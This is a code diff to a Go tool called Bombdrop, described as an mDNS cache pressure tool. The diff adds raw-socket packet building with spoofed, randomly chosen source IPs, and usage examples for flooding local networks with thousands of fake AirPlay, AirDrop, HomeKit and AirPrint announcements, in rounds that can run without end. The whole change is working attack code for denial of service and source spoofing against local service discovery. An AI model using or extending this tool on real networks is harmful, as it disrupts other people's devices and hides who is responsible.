@@ -186,13 +186,218 @@ const (
 	BroadcastTypeAll      BroadcastType = "all"
 )
 
-// Update broadcastAnnouncements to use gopacket
-func broadcastAnnouncements(conn *net.UDPConn, announcements []*dns.Msg, nameMode string, roundNum int, debug bool) {
+// First declare the RawSender type and methods
+type RawSender struct {
+	fd        int
+	iface     *net.Interface
+	srcIP     net.IP
+	dstIP     net.IP
+	dstPort   int
+	spoofCIDR string // CIDR block for generating random source IPs
+}
+
+// RawSender methods
+func NewRawSender(ifaceName string, srcIP, dstIP net.IP, dstPort int, spoofCIDR string) (*RawSender, error) {
+	fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_RAW)
+	if err != nil {
+		return nil, fmt.Errorf("failed to create raw socket: %v", err)
+	}
+
+	err = syscall.SetsockoptInt(fd, syscall.IPPROTO_IP, syscall.IP_HDRINCL, 1)
+	if err != nil {
+		syscall.Close(fd)
+		return nil, fmt.Errorf("failed to set IP_HDRINCL: %v", err)
+	}
+
+	iface, err := net.InterfaceByName(ifaceName)
+	if err != nil {
+		syscall.Close(fd)
+		return nil, fmt.Errorf("interface not found: %v", err)
+	}
+
+	return &RawSender{
+		fd:        fd,
+		iface:     iface,
+		srcIP:     srcIP,
+		dstIP:     dstIP,
+		dstPort:   dstPort,
+		spoofCIDR: spoofCIDR,
+	}, nil
+}
+
+func (r *RawSender) SendPacket(payload []byte) error {
+	// Generate random source IP if none provided
+	var srcIP net.IP
+	if r.srcIP == nil {
+		if r.spoofCIDR != "" {
+			// Use CIDR-based IP generation for network-aware spoofing
+			var err error
+			srcIP, err = generateRandomIPInCIDR(r.spoofCIDR)
+			if err != nil {
+				return fmt.Errorf("failed to generate random IP from CIDR %s: %v", r.spoofCIDR, err)
+			}
+		} else {
+			// Fallback to generic random private IP
+			srcIP = generateRandomIP()
+		}
+	} else {
+		srcIP = r.srcIP
+	}
+
+	// Validate that we have a valid destination IP
+	if r.dstIP == nil {
+		return fmt.Errorf("destination IP is nil")
+	}
+
+	// Create IP header (20 bytes)
+	ipHeader := make([]byte, 20)
+	ipHeader[0] = 0x45 // Version (4) + IHL (5)
+	ipHeader[1] = 0    // Type of Service
+	length := uint16(20 + 8 + len(payload))
+	ipHeader[2] = byte(length >> 8)      // Total Length (high byte)
+	ipHeader[3] = byte(length)           // Total Length (low byte)
+	ipHeader[4] = 0                      // Identification (high byte)
+	ipHeader[5] = 0                      // Identification (low byte)
+	ipHeader[6] = 0                      // Flags + Fragment Offset (high 3 bits)
+	ipHeader[7] = 0                      // Fragment Offset (low 8 bits)
+	ipHeader[8] = 64                     // TTL
+	ipHeader[9] = syscall.IPPROTO_UDP    // Protocol
+	ipHeader[10] = 0                     // Header Checksum (high byte) - will be calculated
+	ipHeader[11] = 0                     // Header Checksum (low byte) - will be calculated
+	copy(ipHeader[12:16], srcIP.To4())   // Source IP
+	copy(ipHeader[16:20], r.dstIP.To4()) // Destination IP
+
+	// Calculate IP header checksum
+	ipChecksum := calculateIPChecksum(ipHeader)
+	ipHeader[10] = byte(ipChecksum >> 8)
+	ipHeader[11] = byte(ipChecksum)
+
+	// Create UDP header (8 bytes)
+	udpHeader := make([]byte, 8)
+	srcPort := uint16(rand.Intn(16383) + 49152) // Random high port
+	udpHeader[0] = byte(srcPort >> 8)           // Source Port (high byte)
+	udpHeader[1] = byte(srcPort)                // Source Port (low byte)
+	udpHeader[2] = byte(r.dstPort >> 8)         // Destination Port (high byte)
+	udpHeader[3] = byte(r.dstPort)              // Destination Port (low byte)
+	udpLen := uint16(8 + len(payload))
+	udpHeader[4] = byte(udpLen >> 8) // UDP Length (high byte)
+	udpHeader[5] = byte(udpLen)      // UDP Length (low byte)
+	udpHeader[6] = 0                 // UDP Checksum (high byte) - will be calculated
+	udpHeader[7] = 0                 // UDP Checksum (low byte) - will be calculated
+
+	// Calculate UDP checksum
+	udpChecksum := calculateUDPChecksum(srcIP.To4(), r.dstIP.To4(), udpHeader, payload)
+	udpHeader[6] = byte(udpChecksum >> 8)
+	udpHeader[7] = byte(udpChecksum)
+
+	// Assemble the complete packet
+	packet := append(ipHeader, udpHeader...)
+	packet = append(packet, payload...)
+
+	// Prepare destination address for sendto
+	addr := syscall.SockaddrInet4{
+		Port: r.dstPort,
+	}
+	copy(addr.Addr[:], r.dstIP.To4())
+
+	// Send the packet
+	err := syscall.Sendto(r.fd, packet, 0, &addr)
+	if err != nil {
+		return fmt.Errorf("failed to send packet: %v", err)
+	}
+
+	return nil
+}
+
+func (r *RawSender) Close() error {
+	return syscall.Close(r.fd)
+}
+
+// calculateIPChecksum calculates the IP header checksum
+func calculateIPChecksum(header []byte) uint16 {
+	var sum uint32
+
+	// Sum all 16-bit words in the header
+	for i := 0; i < len(header); i += 2 {
+		if i+1 < len(header) {
+			sum += uint32(header[i])<<8 + uint32(header[i+1])
+		} else {
+			sum += uint32(header[i]) << 8
+		}
+	}
+
+	// Add carry bits
+	for (sum >> 16) > 0 {
+		sum = (sum & 0xFFFF) + (sum >> 16)
+	}
+
+	// One's complement
+	return uint16(^sum)
+}
+
+// calculateUDPChecksum calculates the UDP checksum including the pseudo-header
+func calculateUDPChecksum(srcIP, dstIP []byte, udpHeader, payload []byte) uint16 {
+	var sum uint32
+
+	// Pseudo-header: srcIP (4) + dstIP (4) + 0 (1) + protocol (1) + udpLen (2)
+	// Add source IP
+	sum += uint32(srcIP[0])<<8 + uint32(srcIP[1])
+	sum += uint32(srcIP[2])<<8 + uint32(srcIP[3])
+
+	// Add destination IP
+	sum += uint32(dstIP[0])<<8 + uint32(dstIP[1])
+	sum += uint32(dstIP[2])<<8 + uint32(dstIP[3])
+
+	// Add protocol (UDP = 17)
+	sum += uint32(17)
+
+	// Add UDP length
+	udpLen := uint32(udpHeader[4])<<8 + uint32(udpHeader[5])
+	sum += udpLen
+
+	// Add UDP header (excluding checksum field)
+	for i := 0; i < len(udpHeader); i += 2 {
+		if i == 6 { // Skip checksum field
+			continue
+		}
+		if i+1 < len(udpHeader) {
+			sum += uint32(udpHeader[i])<<8 + uint32(udpHeader[i+1])
+		}
+	}
+
+	// Add payload
+	for i := 0; i < len(payload); i += 2 {
+		if i+1 < len(payload) {
+			sum += uint32(payload[i])<<8 + uint32(payload[i+1])
+		} else {
+			sum += uint32(payload[i]) << 8
+		}
+	}
+
+	// Add carry bits
+	for (sum >> 16) > 0 {
+		sum = (sum & 0xFFFF) + (sum >> 16)
+	}
+
+	// One's complement
+	checksum := uint16(^sum)
+
+	// UDP checksum of 0 means no checksum, but we want to send a proper checksum
+	// In the very rare case it calculates to 0, we use 0xFFFF instead
+	if checksum == 0 {
+		checksum = 0xFFFF
+	}
+
+	return checksum
+}
+
+// Declare broadcastAnnouncements as a separate function
+func broadcastAnnouncements(conn *net.UDPConn, rawSender *RawSender, announcements []*dns.Msg, nameMode string, roundNum int, debug bool) {
 	startTime := time.Now()
 	announcementCount := 0
 	destAddr := &net.UDPAddr{IP: net.ParseIP("224.0.0.251"), Port: 5353}
 
-	for i, announcement := range announcements {
+	for _, announcement := range announcements {
 		announcementBytes, err := announcement.Pack()
 		if err != nil {
 			if debug {
@@ -201,23 +406,17 @@ func broadcastAnnouncements(conn *net.UDPConn, announcements []*dns.Msg, nameMod
 			continue
 		}
 
-		if enableSpoofing && packetSpoofer != nil {
-			// Use gopacket to send with spoofed source IP
-			err = packetSpoofer.SendSpoofedPacket(announcementBytes, i)
-			if err != nil {
-				if debug {
-					log.Printf("Error sending spoofed packet: %v", err)
-					log.Printf("Falling back to regular UDP")
-				}
-				// Fallback to regular UDP
-				conn.WriteToUDP(announcementBytes, destAddr)
+		if rawSender != nil {
+			// Use raw socket for spoofed packets
+			err = rawSender.SendPacket(announcementBytes)
+			if err != nil && debug {
+				log.Printf("Error sending raw packet: %v", err)
 			}
-		} else {
-			// Use regular UDP socket
-			if _, err := conn.WriteToUDP(announcementBytes, destAddr); err != nil {
-				if debug {
-					log.Printf("Error sending announcement: %v", err)
-				}
+		} else if conn != nil {
+			// Use UDP socket for normal packets
+			_, err = conn.WriteToUDP(announcementBytes, destAddr)
+			if err != nil && debug {
+				log.Printf("Error sending UDP packet: %v", err)
 			}
 		}
 
@@ -240,10 +439,11 @@ func main() {
 	broadcastTypeStr := flag.String("type", "all", "Broadcast type: airplay, airdrop, homekit, airprint, or all")
 	preGenerate := flag.Bool("pregenerate", false, "Pre-generate devices once and reuse them")
 	cacheMode := flag.String("cache", "standard", "Cache pressure mode: standard, aggressive, extreme")
-	spoof := flag.Bool("spoof", false, "Enable IP address spoofing (requires root)")
+	spoofNetwork := flag.String("spoof", "", "Enable IP address spoofing with network CIDR (e.g., -spoof 192.168.1.0/24)")
 	ttlValue := flag.Uint("ttl", uint(DefaultTTL), "TTL value in seconds (default: 7200)")
 	ttlMode := flag.String("ttl-mode", "normal", "TTL mode: normal, long, extreme")
 	nameMode := flag.String("name-mode", "mixed", "Device naming mode: static, dynamic, compare")
+	sourceIP := flag.String("s", "", "Source IP address (default: system chosen)")
 	flag.Parse()
 
 	// Show help if requested or no arguments provided
@@ -252,16 +452,17 @@ func main() {
 Bombdrop - mDNS Cache Pressure Tool
 
 Usage:
-  sudo go run bombdrop.go -n 5000 [-debug] [-i eth0] [-b 224.0.0.251] [-c 10] [-type all]
+  sudo go run bombdrop.go -n 5000 [-debug] [-i eth0] [-b 224.0.0.251] [-s 192.168.1.100] [-c 10] [-type all]
 
 Options:
   -n <num>         Number of devices to advertise (default: 1000)
   -debug           Enable debug logging
   -i <iface>       Network interface to use (default: system chosen)
   -b <ip>          Target IP address (default: 224.0.0.251)
+  -s <ip>          Source IP address (default: system chosen)
   -c <count>       Number of announcement rounds (0 = infinite)
   -type <t>        Broadcast type: airplay, airdrop, homekit, airprint, or all (default: all)
-  -spoof           Enable IP address spoofing (requires root/admin privileges)
+  -spoof <network> Enable IP address spoofing with network CIDR (e.g., -spoof 192.168.1.0/24)
   -ttl <seconds>   TTL value in seconds (default: 7200)
   -ttl-mode <mode> TTL mode: normal, long, extreme (default: normal)
   -name-mode <m>   Device naming mode: static, dynamic, compare (default: mixed)
@@ -280,11 +481,16 @@ Examples:
   # Send 10 rounds of AirPrint announcements and exit
   sudo go run bombdrop.go -n 100 -c 10 -type airprint
 
+  # Use IP spoofing with network-aware random source IPs
+  sudo go run bombdrop.go -n 1000 -spoof 192.168.1.0/24 -type all
+
 Notes:
   - For multicast: 224.0.0.251 is the standard mDNS address
   - For broadcast: use your subnet's broadcast (typically x.x.x.255)
   - For /31 networks: there is no broadcast address, use multicast or direct IP
   - Root/admin privileges are usually required for multicast
+  - IP spoofing (-spoof) requires root privileges and a network CIDR block
+  - Spoofed IPs will be generated randomly within the specified network segment
 `)
 		return
 	}
@@ -313,55 +519,54 @@ Notes:
 		log.Printf("Broadcast type: %s", *broadcastTypeStr)
 	}
 
-	// Create a UDP socket for sending
+	// Parse the source IP
+	var srcIP net.IP
+	if *sourceIP != "" {
+		srcIP = net.ParseIP(*sourceIP)
+		if srcIP == nil {
+			log.Fatalf("Invalid source IP address: %s", *sourceIP)
+		}
+		if *debug {
+			log.Printf("Using source IP: %s", srcIP.String())
+		}
+	}
+
 	var conn *net.UDPConn
+	var rawSender *RawSender
 	var err error
 
-	// Parse the target IP
-	targetIPAddr = net.ParseIP(*targetIP)
-	if targetIPAddr == nil {
-		log.Fatalf("Invalid target IP address: %s", *targetIP)
-	}
-
-	if *spoof {
-		// Configure packet spoofer for IP spoofing
-		packetSpoofer, err = configurePacketSpoofer(*interfaceName, targetIPAddr)
-		if err != nil {
-			log.Fatalf("Failed to configure packet spoofer: %v", err)
-		}
-		enableSpoofing = true
-		defer packetSpoofer.Close()
-	}
-
-	// Create regular UDP socket (used as fallback when spoofing fails)
-	conn, err = net.DialUDP("udp4", nil, &net.UDPAddr{
-		IP:   targetIPAddr,
-		Port: 5353,
-	})
-
-	if err != nil {
-		log.Fatal(err)
-	}
-	defer conn.Close()
-
-	// Only try to set the interface for multicast addresses
-	if *interfaceName != "" {
-		ifi, err := net.InterfaceByName(*interfaceName)
-		if err != nil {
-			log.Fatalf("Error finding interface %s: %v", *interfaceName, err)
-		}
-
+	// Initialize raw sender if spoofing is enabled
+	if *spoofNetwork != "" {
 		if *debug {
-			log.Printf("Using interface: %s", *interfaceName)
+			log.Printf("Initializing raw socket sender with network spoofing: %s", *spoofNetwork)
 		}
+		rawSender, err = NewRawSender(*interfaceName, srcIP, targetIPAddr, 5353, *spoofNetwork)
+		if err != nil {
+			log.Fatalf("Failed to create raw sender: %v", err)
+		}
+		defer rawSender.Close()
+	} else {
+		// Only create UDP socket if not spoofing
+		conn, err = net.DialUDP("udp4", nil, &net.UDPAddr{
+			IP:   targetIPAddr,
+			Port: 5353,
+		})
+		if err != nil {
+			log.Fatal(err)
+		}
+		defer conn.Close()
 
-		// Only set the multicast interface if we're sending to a multicast address
-		if targetIPAddr.IsMulticast() {
-			if err := setMulticastInterface(conn, ifi); err != nil && *debug {
-				log.Printf("Warning: couldn't set multicast interface: %v", err)
+		// Set multicast interface if specified
+		if *interfaceName != "" {
+			ifi, err := net.InterfaceByName(*interfaceName)
+			if err != nil {
+				log.Fatalf("Error finding interface %s: %v", *interfaceName, err)
 			}
-		} else if *debug {
-			log.Printf("Not setting interface on socket for unicast address")
+			if targetIPAddr.IsMulticast() {
+				if err := setMulticastInterface(conn, ifi); err != nil && *debug {
+					log.Printf("Warning: couldn't set multicast interface: %v", err)
+				}
+			}
 		}
 	}
 
@@ -425,23 +630,8 @@ Notes:
 		startTime := time.Now()
 		announcementCount := 0
 
-		for _, announcement := range currentAnnouncements {
-			announcementBytes, err := announcement.Pack()
-			if err != nil {
-				if *debug {
-					log.Printf("Error packing announcement: %v", err)
-				}
-				continue
-			}
-
-			if _, err := conn.Write(announcementBytes); err != nil {
-				if *debug {
-					log.Printf("Error sending announcement: %v", err)
-				}
-			}
-
-			announcementCount++
-		}
+		// When calling broadcastAnnouncements, pass the rawSender
+		broadcastAnnouncements(conn, rawSender, currentAnnouncements, *nameMode, roundsSent, *debug)
 
 		// Calculate how long the broadcast took
 		broadcastDuration := time.Since(startTime)
@@ -478,7 +668,7 @@ Notes:
 			currentAnnouncements = sendInRandomBursts(conn, currentAnnouncements, *debug)
 		default:
 			// Standard steady broadcasts
-			broadcastAnnouncements(conn, currentAnnouncements, *nameMode, roundsSent, *debug)
+			broadcastAnnouncements(conn, nil, currentAnnouncements, *nameMode, roundsSent, *debug)
 		}
 
 		// If cacheFlush is enabled, create special cache-flush records
@@ -734,6 +924,58 @@ func generateDeviceID() string {
 		bytes[0], bytes[1], bytes[2], bytes[3], bytes[4], bytes[5])
 }
 
+// generateRandomIPInCIDR generates a random IP address within the given CIDR block
+func generateRandomIPInCIDR(cidr string) (net.IP, error) {
+	_, network, err := net.ParseCIDR(cidr)
+	if err != nil {
+		return nil, fmt.Errorf("invalid CIDR: %v", err)
+	}
+
+	// Get network address and mask
+	networkIP := network.IP.To4()
+	if networkIP == nil {
+		return nil, fmt.Errorf("only IPv4 CIDR blocks are supported")
+	}
+
+	mask := network.Mask
+	if len(mask) != 4 {
+		return nil, fmt.Errorf("invalid IPv4 mask")
+	}
+
+	// Calculate the number of host bits
+	ones, bits := mask.Size()
+	if bits != 32 {
+		return nil, fmt.Errorf("invalid mask size")
+	}
+	hostBits := bits - ones
+
+	// Generate random host part (avoiding network and broadcast addresses)
+	maxHosts := (1 << hostBits) - 2 // -2 for network and broadcast
+	if maxHosts <= 0 {
+		return nil, fmt.Errorf("network too small for host addresses")
+	}
+
+	randomHost := rand.Intn(maxHosts) + 1 // +1 to skip network address
+
+	// Create the IP by applying the random host bits to the network
+	ip := make(net.IP, 4)
+	copy(ip, networkIP)
+
+	// Apply the random host part
+	hostIP := uint32(randomHost)
+	for i := 3; i >= 0; i-- {
+		if mask[i] != 0xFF {
+			// This byte has host bits
+			hostByte := byte(hostIP & 0xFF)
+			ip[i] = (ip[i] & mask[i]) | (hostByte & ^mask[i])
+			hostIP >>= 8
+		}
+	}
+
+	return ip, nil
+}
+
+// generateRandomIP generates a random private IP (fallback for compatibility)
 func generateRandomIP() net.IP {
 	ip := make(net.IP, 4)
 	// Generate a random private IP address
@@ -1465,71 +1707,51 @@ func generateDeviceAnnouncements(name string, deviceID string, broadcastTypes []
 
 // PacketSpoofer represents a utility for sending spoofed packets
 type PacketSpoofer struct {
-	handle      *pcap.Handle
-	ifaceName   string
-	targetIP    net.IP
-	targetPort  int
-	sourcePorts []int
-	sourceIPs   []net.IP
-	ifaceInfo   *net.Interface
+	handle       *pcap.Handle
+	ifaceName    string
+	targetIP     net.IP
+	sourceIP     net.IP
+	targetPort   int
+	sourcePorts  []int
+	ifaceInfo    *net.Interface
+	defaultSrcIP net.IP
 }
 
 // NewPacketSpoofer creates a new packet spoofer
-func NewPacketSpoofer(ifaceName string, targetIP net.IP, targetPort int) (*PacketSpoofer, error) {
-	// Find the network interface
+func NewPacketSpoofer(ifaceName string, targetIP, sourceIP net.IP, targetPort int) (*PacketSpoofer, error) {
 	iface, err := net.InterfaceByName(ifaceName)
 	if err != nil {
 		return nil, fmt.Errorf("interface not found: %v", err)
 	}
 
-	// Open a pcap handle for sending packets
 	handle, err := pcap.OpenLive(ifaceName, 65536, true, pcap.BlockForever)
 	if err != nil {
 		return nil, fmt.Errorf("error opening pcap handle: %v", err)
 	}
 
-	// Generate random source ports in high range
-	sourcePorts := make([]int, 100)
-	for i := 0; i < 100; i++ {
-		sourcePorts[i] = rand.Intn(16383) + 49152 // Ephemeral ports
-	}
-
 	spoofer := &PacketSpoofer{
-		handle:      handle,
-		ifaceName:   ifaceName,
-		targetIP:    targetIP,
-		targetPort:  targetPort,
-		sourcePorts: sourcePorts,
-		ifaceInfo:   iface,
+		handle:     handle,
+		ifaceName:  ifaceName,
+		targetIP:   targetIP,
+		sourceIP:   sourceIP,
+		targetPort: targetPort,
+		ifaceInfo:  iface,
 	}
-
-	// Generate random source IPs
-	spoofer.GenerateSpoofedIPs(100)
 
 	return spoofer, nil
 }
 
-// GenerateSpoofedIPs generates random source IPs for spoofing
-func (s *PacketSpoofer) GenerateSpoofedIPs(count int) {
-	s.sourceIPs = make([]net.IP, count)
-	for i := 0; i < count; i++ {
-		s.sourceIPs[i] = generateRandomIP()
-	}
-	log.Printf("Generated %d spoofed source IPs", count)
-}
-
 // SendSpoofedPacket sends a DNS packet with a spoofed source IP
-func (s *PacketSpoofer) SendSpoofedPacket(payload []byte, index int) error {
-	// Get random source IP and port
-	sourceIP := s.sourceIPs[index%len(s.sourceIPs)]
-	sourcePort := s.sourcePorts[index%len(s.sourcePorts)]
-
-	// Get MAC addresses
-	srcMAC := s.ifaceInfo.HardwareAddr
+func (s *PacketSpoofer) SendSpoofedPacket(payload []byte) error {
+	srcIP := s.sourceIP
+	if srcIP == nil {
+		// If no source IP specified, generate a random one
+		srcIP = generateRandomIP()
+	}
 
 	// Create a new Ethernet layer
 	eth := layers.Ethernet{
-		SrcMAC:       srcMAC,
+		SrcMAC:       s.ifaceInfo.HardwareAddr,
 		DstMAC:       net.HardwareAddr{0x01, 0x00, 0x5e, 0x00, 0x00, 0xfb}, // mDNS MAC
 		EthernetType: layers.EthernetTypeIPv4,
 	}
@@ -1539,47 +1761,36 @@ func (s *PacketSpoofer) SendSpoofedPacket(payload []byte, index int) error {
 		Version:  4,
 		TTL:      64,
 		Protocol: layers.IPProtocolUDP,
-		SrcIP:    sourceIP,
+		SrcIP:    srcIP,
 		DstIP:    s.targetIP,
 	}
 
 	// Create UDP layer
 	udp := layers.UDP{
-		SrcPort: layers.UDPPort(sourcePort),
+		SrcPort: layers.UDPPort(rand.Intn(16383) + 49152), // Random high port
 		DstPort: layers.UDPPort(s.targetPort),
 	}
-
-	// Set checksum on UDP
 	udp.SetNetworkLayerForChecksum(&ip)
 
-	// Create the buffer for our packet
+	// Serialize packet
 	buf := gopacket.NewSerializeBuffer()
 	opts := gopacket.SerializeOptions{
 		ComputeChecksums: true,
 		FixLengths:       true,
 	}
 
-	// Add payload
-	payloadLayer := gopacket.Payload(payload)
-
-	// Serialize packet
 	err := gopacket.SerializeLayers(buf, opts,
 		&eth,
 		&ip,
 		&udp,
-		payloadLayer,
+		gopacket.Payload(payload),
 	)
 	if err != nil {
 		return fmt.Errorf("error serializing packet: %v", err)
 	}
 
 	// Send the packet
-	err = s.handle.WritePacketData(buf.Bytes())
-	if err != nil {
-		return fmt.Errorf("error sending packet: %v", err)
-	}
-
-	return nil
+	return s.handle.WritePacketData(buf.Bytes())
 }
 
 // Close closes the spoofer
@@ -1588,7 +1799,7 @@ func (s *PacketSpoofer) Close() {
 }
 
 // Update the configurePacketSpoofer function
-func configurePacketSpoofer(interfaceName string, targetIP net.IP) (*PacketSpoofer, error) {
+func configurePacketSpoofer(interfaceName string, targetIP net.IP, sourceIP net.IP) (*PacketSpoofer, error) {
 	log.Printf("Setting up IP spoofing with gopacket...")
 
 	// If no interface specified, find a suitable one
@@ -1620,7 +1831,7 @@ func configurePacketSpoofer(interfaceName string, targetIP net.IP) (*PacketSpoof
 	}
 
 	// Create the packet spoofer
-	spoofer, err := NewPacketSpoofer(interfaceName, targetIP, 5353)
+	spoofer, err := NewPacketSpoofer(interfaceName, targetIP, sourceIP, 5353)
 	if err != nil {
 		return nil, fmt.Errorf("failed to create packet spoofer: %v", err)
 	}
